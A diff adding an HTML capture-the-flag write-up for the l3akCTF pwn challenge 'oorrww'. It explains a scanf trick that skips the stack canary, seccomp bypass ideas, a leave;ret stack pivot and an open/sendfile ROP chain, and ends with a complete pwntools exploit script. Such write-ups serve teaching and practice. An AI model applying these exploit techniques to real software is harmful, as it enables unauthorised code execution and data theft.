@@ -1,12 +1,700 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>oorrww</title>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="generator" content="Asciidoctor 2.0.23">
+<meta name="description" content="Everyone gets award.">
+<meta name="author" content="Lenart">
+<title>oorrww - some other bytes to rop l3akCTF</title>
+<style>
+html, body {
+    height: 100%;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    color: #FEFEFE;
+    background-color: #252735;
+    margin: 0 auto;
+    padding: 20px;
+    line-height: 1.6;
+    max-width: 60%;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    display: flex;
+    flex-direction: column;
+    min-height: 100%;
+}
+
+.highlight {
+    background-color: #0f1010;
+}
+
+.listingblock {
+    background-color: #0f1010;
+    border: 1px solid #0f1010;
+    border-radius: 5px;
+    margin: 10px 0;
+    padding: 10px;
+}
+
+/*code {*/
+/*    background-color: #0f1010;*/
+/*}*/
+
+/*pre.CodeRay {*/
+/*    background: #070707*/
+/*}*/
+
+a {
+    color: #93ffd7;
+    text-decoration: none;
+}
+
+@font-face {
+    font-family: "unifont";
+    src: url("./unifont.woff") format('woff');
+}
+
+pre {
+    font-family: "unifont", "Lucida Console", monospace, Monaco;
+    font-size: 16px;
+    line-height: 1.0;
+    padding-left: 20px;
+}
+
+h1 {
+    color: #ececec;
+    text-align: center;
+}
+
+p {
+    margin: 10px 0;
+}
+
+ul {
+    list-style-type: disc;
+    margin: 10px 0;
+    padding-left: 20px;
+}
+
+li {
+    margin: 5px 0;
+}
+
+#footer {
+    height: 60px;
+    background-color: #252735;
+    color: #d3d3d3;
+    text-align: center;
+    padding: 20px;
+    box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+    flex-shrink: 0;
+}
+</style>
+<style>
+/*! Stylesheet for CodeRay to loosely match GitHub themes | MIT License */
+pre.CodeRay{background:#0f1010}
+.CodeRay .line-numbers{border-right:1px solid;opacity:.35;padding:5 2.5em 2 2;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+.CodeRay span.line-numbers{display:inline-block;margin-right:.75em}
+.CodeRay .line-numbers strong{color:#000}
+table.CodeRay{border-collapse:separate;border:0;margin-bottom:0;background:none}
+table.CodeRay td{vertical-align:top;line-height:inherit}
+table.CodeRay td.line-numbers{text-align:right}
+table.CodeRay td.code{padding:2 2 2 2.75em}
+.CodeRay .debug{color:#fff!important;background:navy!important}
+.CodeRay .annotation{color:#007}
+.CodeRay .attribute-name{color:navy}
+.CodeRay .attribute-value{color:#700}
+.CodeRay .binary{color:#509}
+.CodeRay .comment{color:#998;font-style:italic}
+.CodeRay .char{color:#04d}
+.CodeRay .char .content{color:#04d}
+.CodeRay .char .delimiter{color:#039}
+.CodeRay .class{color:#458;font-weight:bold}
+.CodeRay .complex{color:#a08}
+.CodeRay .constant,.CodeRay .predefined-constant{color:teal}
+.CodeRay .color{color:#099}
+.CodeRay .class-variable{color:#369}
+.CodeRay .decorator{color:#b0b}
+.CodeRay .definition{color:#099}
+.CodeRay .delimiter{color:#000}
+.CodeRay .doc{color:#970}
+.CodeRay .doctype{color:#34b}
+.CodeRay .doc-string{color:#d42}
+.CodeRay .escape{color:#666}
+.CodeRay .entity{color:#800}
+.CodeRay .error{color:#808}
+.CodeRay .exception{color:inherit}
+.CodeRay .filename{color:#099}
+.CodeRay .function{color:#900;font-weight:bold}
+.CodeRay .global-variable{color:teal}
+.CodeRay .hex{color:#058}
+.CodeRay .integer,.CodeRay .float{color:#099}
+.CodeRay .include{color:#555}
+.CodeRay .inline{color:#000}
+.CodeRay .inline .inline{background:#ccc}
+.CodeRay .inline .inline .inline{background:#bbb}
+.CodeRay .inline .inline-delimiter{color:#d14}
+.CodeRay .inline-delimiter{color:#d14}
+.CodeRay .important{color:#555;font-weight:bold}
+.CodeRay .interpreted{color:#b2b}
+.CodeRay .instance-variable{color:teal}
+.CodeRay .label{color:#970}
+.CodeRay .local-variable{color:#963}
+.CodeRay .octal{color:#40e}
+.CodeRay .predefined{color:#369}
+.CodeRay .preprocessor{color:#579}
+.CodeRay .pseudo-class{color:#555}
+.CodeRay .directive{font-weight:bold}
+.CodeRay .type{font-weight:bold}
+.CodeRay .predefined-type{color:inherit}
+.CodeRay .reserved,.CodeRay .keyword{color:#f3410b;font-weight:bold}
+.CodeRay .key{color:#808}
+.CodeRay .key .delimiter{color:#606}
+.CodeRay .key .char{color:#80f}
+.CodeRay .value{color:#088}
+.CodeRay .regexp .delimiter{color:#808}
+.CodeRay .regexp .content{color:#808}
+.CodeRay .regexp .modifier{color:#808}
+.CodeRay .regexp .char{color:#d14}
+.CodeRay .regexp .function{color:#404;font-weight:bold}
+.CodeRay .string{color:#d20}
+.CodeRay .string .string .string{background:#ffd0d0}
+.CodeRay .string .content{color:#d14}
+.CodeRay .string .char{color:#d14}
+.CodeRay .string .delimiter{color:#d14}
+.CodeRay .shell{color:#d14}
+.CodeRay .shell .delimiter{color:#d14}
+.CodeRay .symbol{color:#990073}
+.CodeRay .symbol .content{color:#a60}
+.CodeRay .symbol .delimiter{color:#630}
+.CodeRay .tag{color:teal}
+.CodeRay .tag-special{color:#d70}
+.CodeRay .variable{color:#036}
+.CodeRay .insert{background:#afa}
+.CodeRay .delete{background:#faa}
+.CodeRay .change{color:#aaf;background:#007}
+.CodeRay .head{color:#f8f;background:#505}
+.CodeRay .insert .insert{color:#080}
+.CodeRay .delete .delete{color:#800}
+.CodeRay .change .change{color:#66f}
+.CodeRay .head .head{color:#f4f}
+</style>
 </head>
-<body>
+<body class="article">
+<div id="header">
+<h1>oorrww - some other bytes to rop l3akCTF</h1>
+<div class="details">
+<span id="author" class="author">Lenart</span><br>
+</div>
+<div id="toc" class="toc">
+<div id="toctitle">Table of Contents</div>
+<ul class="sectlevel1">
+<li><a href="#_challenge">Challenge</a></li>
+<li><a href="#_enumeration">Enumeration:</a></li>
+<li><a href="#_leak_libc_and_exploit_using_rop_chain">Leak libc and exploit using ROP chain:</a>
+<ul class="sectlevel2">
+<li><a href="#_leak_libc">Leak libc:</a></li>
+<li><a href="#_rop_chain">ROP chain:</a></li>
+<li><a href="#_the_strategy">The strategy</a></li>
+<li><a href="#_exploitation">Exploitation</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="content">
+<div id="preamble">
+<div class="sectionbody">
+<div class="paragraph">
+<p><a href="../../index.html">Back to Home</a></p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_challenge">Challenge</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p><strong>open/read/write or just open&amp;send</strong></p>
+</div>
+<div class="paragraph">
+<p>This is a pwn challenge from the l3akCTF first edition.</p>
+</div>
+<div class="paragraph">
+<p>We are given an ELF binary, a libc, a Dockerfile and a docker-compose.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_enumeration">Enumeration:</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Running the binary, we get this:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="shell">lenart@xorr0r0:~/ctf/oorrww_dist$ ./oorrww
+here are gifts for you: 6.95282314239992e-310 6.606487017994984e-310!
+input:</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>There are some double values that seem important, but we don&#8217;t know what they are just yet.
+It then takes our input, and seemingly it takes numbers as input, not chars.</p>
+</div>
+<div class="paragraph">
+<p>After playing around a bit, I realized it takes input in a loop, and after 22 inputs, it just crashes:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="shell">*** stack smashing detected ***: terminated</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Great, but it looks like there is the stack canary enabled which makes it harder to create a classical
+buffer overflow.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="shell">RELRO         Full RELRO
+STACK CANARY  Canary found
+NX            NX enabled
+PIE           PIE enabled</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Let&#8217;s finally open it in Binja.</p>
+</div>
+<div class="paragraph">
+<p>The main function:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="c"><span class="octal">000013</span>b2  int64_t main()
 
-<h1>Cool binary exploitation</h1>
+<span class="octal">000013</span>c1      int32_t rdi
+<span class="octal">000013</span>c1      int32_t var_bc = rdi
+<span class="octal">000013</span>c7      int64_t rsi
+<span class="octal">000013</span>c7      int64_t var_c8 = rsi
+<span class="octal">000013</span>ce      <span class="directive">void</span>* fsbase
+<span class="octal">000013</span>ce      int64_t rax = *(fsbase + <span class="hex">0x28</span>)
+<span class="octal">00001</span><span class="float">3</span>e2      init()
+<span class="octal">00001</span><span class="float">3</span>ec      sandbox()
+<span class="octal">00001</span><span class="float">3f</span>b      <span class="directive">void</span> var_a8
+<span class="octal">00001</span><span class="float">3f</span>b      gifts(&amp;var_a8)
+<span class="octal">00001455</span>      <span class="keyword">for</span> (int32_t i = <span class="integer">0</span>; i s&lt;= <span class="hex">0x15</span>; i = i + <span class="integer">1</span>)
+<span class="octal">00001416</span>          puts(<span class="string"><span class="delimiter">&quot;</span><span class="content">input:</span><span class="delimiter">&quot;</span></span>)
+<span class="octal">00001442</span>          __isoc99_scanf(&amp;data_2035, sx.q(i &lt;&lt; <span class="integer">3</span>) + &amp;var_a8, &amp;var_a8)
+<span class="octal">00001457</span>      int64_t rax_8 = <span class="integer">0</span>
+<span class="octal">000014</span><span class="integer">69</span>      <span class="keyword">if</span> (rax != *(fsbase + <span class="hex">0x28</span>))
+<span class="octal">0000146</span>b          rax_8 = __stack_chk_fail()
+<span class="octal">00001471</span>      <span class="keyword">return</span> rax_8</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Seeing the <code>sandbox()</code> function I realized not only it is protected by the stack canary and the other compiler&#8217;s protections
+but also seemingly there is some sandboxing security measures.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="shell">lenart@xorr0r0:~/ctf/oorrww_dist$ seccomp-tools dump ./oorrww
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
+ 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
+ 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x06 0x00 0x00 0x00000000  return KILL</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>The trick to bypass seccomp rules is, If it doesn&#8217;t check for the arch type, we could simply call another arch instruction,
+for example, call int 0x80 instead of syscall, or if it didn&#8217;t check for the syscall number greater than <code>0x40000000</code>,
+we could pass <code>0x40000000 + SYSCALL_NUMBER</code> because apparently the Linux kernel ignores the high-order bits in the syscall number.
+Another trick is to find other alternative system calls.</p>
+</div>
+<div class="paragraph">
+<p>The challenge name gives some hints, <code>oorrww</code> is an abbreviation for <code>open/read/write</code>.</p>
+</div>
+<div class="paragraph">
+<p>Getting back to Binja, we have:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="c">main()
+...
+gifts(&amp;var_a8)
+...
 
+<span class="octal">00001331</span>  int64_t gifts(int64_t arg1)
+<span class="octal">00001341</span>      <span class="directive">void</span>* fsbase
+<span class="octal">00001341</span>      int64_t rax = *(fsbase + <span class="hex">0x28</span>)
+<span class="octal">00001357</span>      int64_t (* <span class="directive">const</span> var_28)() = __isoc99_scanf
+<span class="octal">000013</span><span class="float">7</span>e      int512_t zmm1
+<span class="octal">000013</span><span class="float">7</span>e      zmm1.o = zx.o(__isoc99_scanf)
+<span class="octal">00001</span><span class="integer">396</span>      printf(<span class="string"><span class="delimiter">&quot;</span><span class="content">here are gifts for you: %.16g %.…</span><span class="delimiter">&quot;</span></span>, arg1, zmm1)
+<span class="octal">000013</span>a0      int64_t rax_4 = rax - *(fsbase + <span class="hex">0x28</span>)
+<span class="octal">000013</span>a9      <span class="keyword">if</span> (rax != *(fsbase + <span class="hex">0x28</span>))
+<span class="octal">000013</span>ab          rax_4 = __stack_chk_fail()
+<span class="octal">000013</span>b1      <span class="keyword">return</span> rax_4</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>So, the program leaks the address of the <code>var_a8</code> (which is the buffer where we write), and <code>__isoc99_scanf</code>.
+Here is a script to convert the leaked addresses to hex:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="python">fleak = io.recvline().strip().decode().split()
+buffer_leak = <span class="predefined">float</span>.hex(<span class="predefined">float</span>(fleak[<span class="integer">5</span>]))
+buffer_leak = <span class="predefined">int</span>(buffer_leak[<span class="integer">5</span>:<span class="integer">17</span>], <span class="integer">16</span>)
+
+scanf_leak = <span class="predefined">float</span>.hex(<span class="predefined">float</span>(fleak[<span class="integer">6</span>][:-<span class="integer">1</span>]))
+scanf_leak = <span class="predefined">int</span>(scanf_leak[<span class="integer">5</span>:<span class="integer">17</span>], <span class="integer">16</span>)</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Next, in the binary, we have:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="c"><span class="octal">00001455</span>      <span class="keyword">for</span> (int32_t i = <span class="integer">0</span>; i s&lt;= <span class="hex">0x15</span>; i = i + <span class="integer">1</span>)
+<span class="octal">00001416</span>          puts(<span class="string"><span class="delimiter">&quot;</span><span class="content">input:</span><span class="delimiter">&quot;</span></span>)
+<span class="octal">00001442</span>          __isoc99_scanf(&amp;data_2035, sx.q(i &lt;&lt; <span class="integer">3</span>) + &amp;var_a8, &amp;var_a8)</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>It takes our inputs up to 22 times, and it will eventually overflow the buffer.</p>
+</div>
+<div class="paragraph">
+<p>We can use a trick to bypass the stack canary by confusing the <code>scanf</code> function[1]:</p>
+</div>
+<div class="paragraph">
+<p>1: <a href="https://rehex.ninja/posts/scanf-and-hateful-dot/">pwn&gt; scanf and hateful dot</a></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>+--------+
+| AAAAAA | &lt;- start of the buffer
+|   A    |
+|   A    |
+|   A    |
+|   A    |
+|   A    |
+|   .    | &lt;- Bypass the canary because scanf wouldn't write .
+| 0x1337 | &lt;- return address we can control and jump wherever we want
++--------+</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Now we have to deal with the fact that we only have 22 inputs, each of 8 bytes;
+this means we only have one byte after the stack canary.</p>
+</div>
+<div class="paragraph">
+<p>We can use the stack pivoting technique[2] to control a larger stack using the following gadget.</p>
+</div>
+<div class="paragraph">
+<p>2: <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting/exploitation/leave">leave</a></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="shell">lenart@xorr0r0:~/ctf/oorrww_dist$ ROPgadget --binary oorrww
+0x00000000000012a3 : leave ; ret</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>That is good, we can fill our buffer with a ROP chain and then pivot the stack to the start of the buffer.</p>
+</div>
+<div class="paragraph">
+<p>Here is what happens to the stack:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>+---------+
+|    A    | &lt;- start of the buffer
+|    A    |
+|    A    |
+|    A    |
+|    A    |
+|    A    |
+|    .    | &lt;- Bypass the canary because scanf woudldn't write .
+|  0x1337 | &lt;- address of leave; ret ----&gt;----
++---------+                                  |
+                                             |
+                 rbp aka base pointer -&gt;  +------+ &lt;- A stack that we don't control
+                                          |      |
+                                          |      |
+                                          |      |
+                                          +------+</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Here is what is happening when calling <code>leave; ret</code> instruction:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="asm">mov rsp, rbp
+pop rbp</code></pre>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_leak_libc_and_exploit_using_rop_chain">Leak libc and exploit using ROP chain:</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="_leak_libc">Leak libc:</h3>
+<div class="paragraph">
+<p>We can get the libc base address using the <code>scanf</code> leaked address.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>libc.base = scanf_leaked_address - scanf_offset_in_libc</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>And from this we can find every gadget in the libc using <code>libc.base + gadget_offset</code>.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_rop_chain">ROP chain:</h3>
+<div class="paragraph">
+<p>The idea of ROP chain is as following:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="asm">pop rax     ; move the first value in the stack into rax
+ret         ; pop return address from rbp and return to it.</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>We can chain the gadgets to control the registers and call the system calls or libc functions.</p>
+</div>
+<div class="paragraph">
+<p>EX:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Addresses |                                        The stack
+          |                                 +--------------------+
+          | pop rax ----------------------&gt; |         2          |
+          |                                 +--------------------+
+          | ret --------------------------&gt; |        0x42        |
+          |                                 +--------------------+
+  0x42    | pop rdi ----------------------&gt; | 0x7478742e67616c66 + -&gt; flag.txt----&gt; The addresss pointing to flag.txt
+          |                                 +--------------------+
+          | ret --------------------------&gt; |       0x1337       |
+          |                                 +--------------------+
+ 0x1337   | pop rsi ----------------------&gt; |         0          |
+          |                                 +--------------------+
+          | ret --------------------------&gt; |      0xca11        |
+          |                                 +--------------------+
+ 0xca11   | syscall</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>The above figure shows how to set some registers and call open syscall. Under linux x64_86, each syscall
+has a specific number and the rax register used to register the number of the desired syscall, which is 2
+in the case of <code>open</code> according linux system call table[3].
+If you want to see them by yourself, you can navigate somewhere around <code>/usr/src/(kernel_name)/arch/x86/entry/syscalls/syscall_64.tbl</code>.</p>
+</div>
+<div class="paragraph">
+<p>3: <a href="https://filippo.io/linux-syscall-table/">linux syscall table</a></p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_the_strategy">The strategy</h3>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>We can only write eight bytes at a time, so we can write <code>flag.txt</code> at the start of our buffer as this strings
+is required by the open syscall, and we don&#8217;t have it in the binary file.</p>
+</li>
+<li>
+<p>Open requires a null terminated string. However, the stack has garbage on it, so when writing it at the start of the stack,
+it is not null terminated, so the next eight bytes should contain a null byte.</p>
+</li>
+<li>
+<p>Having <code>flag.txt\0</code> on the top of the stack. We can fill the rest of the stack with a rop chain to open/read/write it.</p>
+</li>
+<li>
+<p>bypass the canary with a <code>.</code>.</p>
+</li>
+<li>
+<p>We have an extra 16 bytes to pivot the stack and change <code>ret</code> address. First, we put the address of the buffer
+leaked by the program  <code>+ 8</code> (We don&#8217;t want to jump to 0x0 null byte terminator of flag.txt as it is at the top of the stack)
+so <code>leave</code> will pivot our stack to the start of our rop chain.</p>
+</li>
+<li>
+<p>We change the <code>ret</code> to the <code>leave; ret</code> gadget address.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>We still have a tiny stack space in which we can&#8217;t fit <code>open/read/write</code> system calls.</p>
+</div>
+<div class="paragraph">
+<p>Instead, we can open the flag file and use <code>sendfile</code> system call, saving us some space on the stack.</p>
+</div>
+<div class="paragraph">
+<p>The man of <code>sendfile</code> says:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>       sendfile() copies data between one file descriptor and another.
+       Because this copying is done within the kernel, sendfile() is
+       more efficient than the combination of read(2) and write(2),
+       which would require transferring data to and from user space.
+
+       in_fd should be a file descriptor opened for reading and out_fd
+       should be a descriptor opened for writing.</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>The <code>sendfile</code> prototype is:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="c">ssize_t sendfile(<span class="predefined-type">int</span> out_fd, <span class="predefined-type">int</span> in_fd, off_t *offset, size_t count);</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="asm">%rax 40
+%rdi int out_fd
+%rsi int in_fd
+%rdx loff_t *offset
+%r10  size_t count</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>And we have this gadget to control the registers:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>0x0000000000119170: endbr64; mov r10, rcx; mov eax, 0x28; syscall;</pre>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_exploitation">Exploitation</h3>
+<div class="paragraph">
+<p>With all that, here is the final unformatted script:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="CodeRay highlight"><code data-lang="python"><span class="comment">#!/usr/bin/env python3</span>
+<span class="comment"># -*- coding: utf-8 -*-</span>
+<span class="keyword">from</span> <span class="include">pwn</span> <span class="keyword">import</span> <span class="include">*</span>
+<span class="keyword">import</span> <span class="include">struct</span>
+
+<span class="comment">#context.terminal = 'kitty'</span>
+context.terminal = [<span class="string"><span class="delimiter">&quot;</span><span class="content">tmux</span><span class="delimiter">&quot;</span></span>, <span class="string"><span class="delimiter">&quot;</span><span class="content">splitw</span><span class="delimiter">&quot;</span></span>, <span class="string"><span class="delimiter">&quot;</span><span class="content">-h</span><span class="delimiter">&quot;</span></span>]
+logger = logging.getLogger(__name__)
+
+exe = context.binary = ELF(args.EXE <span class="keyword">or</span> <span class="string"><span class="delimiter">'</span><span class="content">./oorrww_patched</span><span class="delimiter">'</span></span>)
+libc = ELF(<span class="string"><span class="delimiter">&quot;</span><span class="content">./libc.so.6</span><span class="delimiter">&quot;</span></span>)
+ld = ELF(<span class="string"><span class="delimiter">&quot;</span><span class="content">./ld-2.35.so</span><span class="delimiter">&quot;</span></span>)
+
+io = process([exe.path])
+<span class="comment">#io = remote('193.148.168.30', 7666)</span>
+<span class="comment">#gdb.attach(io, gdbscript=gdbscript)</span>
+
+fleak = io.recvline().strip().decode().split()
+buffer_leak = <span class="predefined">float</span>.hex(<span class="predefined">float</span>(fleak[<span class="integer">5</span>]))
+buffer_leak = <span class="predefined">int</span>(buffer_leak[<span class="integer">5</span>:<span class="integer">17</span>], <span class="integer">16</span>)
+
+scanf_leak = <span class="predefined">float</span>.hex(<span class="predefined">float</span>(fleak[<span class="integer">6</span>][:-<span class="integer">1</span>]))
+scanf_leak = <span class="predefined">int</span>(scanf_leak[<span class="integer">5</span>:<span class="integer">17</span>], <span class="integer">16</span>)
+
+libc.address = scanf_leak - libc.symbols[<span class="string"><span class="delimiter">'</span><span class="content">__isoc99_scanf</span><span class="delimiter">'</span></span>]
+print(<span class="string"><span class="delimiter">&quot;</span><span class="content">LIBC @ {}</span><span class="delimiter">&quot;</span></span>.format(<span class="predefined">hex</span>(libc.address)))
+
+rop = ROP(libc)
+pop_rdi = (rop.find_gadget([<span class="string"><span class="delimiter">'</span><span class="content">pop rdi</span><span class="delimiter">'</span></span>, <span class="string"><span class="delimiter">'</span><span class="content">ret</span><span class="delimiter">'</span></span>]))[<span class="integer">0</span>]
+pop_rsi = (rop.find_gadget([<span class="string"><span class="delimiter">'</span><span class="content">pop rsi</span><span class="delimiter">'</span></span>, <span class="string"><span class="delimiter">'</span><span class="content">ret</span><span class="delimiter">'</span></span>]))[<span class="integer">0</span>]
+pop_rax = (rop.find_gadget([<span class="string"><span class="delimiter">'</span><span class="content">pop rax</span><span class="delimiter">'</span></span>, <span class="string"><span class="delimiter">'</span><span class="content">ret</span><span class="delimiter">'</span></span>]))[<span class="integer">0</span>]
+pop_rdx = libc.address + <span class="hex">0x11f2e7</span>
+syscall = (rop.find_gadget([<span class="string"><span class="delimiter">'</span><span class="content">syscall</span><span class="delimiter">'</span></span>, <span class="string"><span class="delimiter">'</span><span class="content">ret</span><span class="delimiter">'</span></span>]))[<span class="integer">0</span>]
+leave_ret = (rop.find_gadget([<span class="string"><span class="delimiter">'</span><span class="content">leave</span><span class="delimiter">'</span></span>, <span class="string"><span class="delimiter">'</span><span class="content">ret</span><span class="delimiter">'</span></span>]))[<span class="integer">0</span>]
+ret = (rop.find_gadget([<span class="string"><span class="delimiter">'</span><span class="content">ret</span><span class="delimiter">'</span></span>]))[<span class="integer">0</span>]
+
+gdbscript=<span class="string"><span class="delimiter">&quot;&quot;&quot;</span><span class="content">
+</span><span class="content">b *{}</span><span class="content">
+</span><span class="content">b *{}</span><span class="content">
+</span><span class="delimiter">&quot;&quot;&quot;</span></span>.format(leave_ret, syscall)
+<span class="comment">#gdb.attach(io, gdbscript=gdbscript)</span>
+
+<span class="keyword">def</span> <span class="function">pack_input</span>(data):
+    val = p64(data).hex()
+    <span class="keyword">return</span> (struct.unpack(<span class="string"><span class="delimiter">'</span><span class="content">d</span><span class="delimiter">'</span></span>, <span class="predefined">bytes</span>.fromhex(val))[<span class="integer">0</span>])
+
+<span class="keyword">def</span> <span class="function">create_string</span>(string):
+    f = string.encode().hex()
+    ba = <span class="predefined">bytearray</span>.fromhex(f)
+    ba.reverse()
+    s = <span class="string"><span class="delimiter">'</span><span class="delimiter">'</span></span>.join(format(x, <span class="string"><span class="delimiter">&quot;</span><span class="content">02x</span><span class="delimiter">&quot;</span></span>) <span class="keyword">for</span> x <span class="keyword">in</span> ba)
+    <span class="keyword">return</span> s
+
+<span class="keyword">def</span> <span class="function">send_address</span>(addr):
+    io.sendline(<span class="string"><span class="delimiter">&quot;</span><span class="content">{}</span><span class="delimiter">&quot;</span></span>.format(pack_input(addr)))
+
+print(<span class="string"><span class="delimiter">&quot;</span><span class="content">Addr: scanf({}) buffer({})</span><span class="delimiter">&quot;</span></span>.format(<span class="predefined">hex</span>(scanf_leak), <span class="predefined">hex</span>(buffer_leak)))
+<span class="keyword">def</span> <span class="function">overflow</span>(r):
+    send_address(<span class="hex">0x007478742e67616c66</span>)
+    send_address(<span class="hex">0x00</span>)
+
+    <span class="comment"># Open</span>
+    send_address(pop_rdi)
+    send_address(buffer_leak)
+    send_address(pop_rsi)
+    send_address(<span class="hex">0x0</span>)
+    send_address(pop_rax)
+    send_address(<span class="hex">0x2</span>)
+    send_address(syscall)
+
+    <span class="comment"># sendfile</span>
+    send_address(libc.address + <span class="hex">0x000000000003d1ee</span>)
+    send_address(<span class="hex">0x200</span>)
+    send_address(pop_rsi)
+    send_address(<span class="hex">0x3</span>)
+    send_address(pop_rdi)
+    send_address(<span class="integer">1</span>)
+    send_address(libc.address + <span class="hex">0x0000000000119170</span>)
+
+    send_address(libc.sym.read)
+
+    send_address(libc.sym.write)
+    send_address(pop_rdi)
+
+    <span class="comment"># Bypass the canary</span>
+    io.sendline(<span class="binary"><span class="modifier">b</span><span class="delimiter">&quot;</span><span class="content">.</span><span class="delimiter">&quot;</span></span>)
+    io.sendline(<span class="string"><span class="delimiter">&quot;</span><span class="content">{}</span><span class="delimiter">&quot;</span></span>.format(pack_input(buffer_leak + <span class="integer">8</span>)))
+
+
+<span class="keyword">def</span> <span class="function">first_stage</span>():
+    overflow(<span class="integer">0</span>);
+    io.sendline(<span class="string"><span class="delimiter">&quot;</span><span class="content">{}</span><span class="delimiter">&quot;</span></span>.format(pack_input(leave_ret)))
+
+first_stage()
+io.interactive()</code></pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="footer">
+<div id="footer-text">
+Last updated 2024-12-01 19:53:30 +0100
+</div>
+</div>
 </body>
 </html>
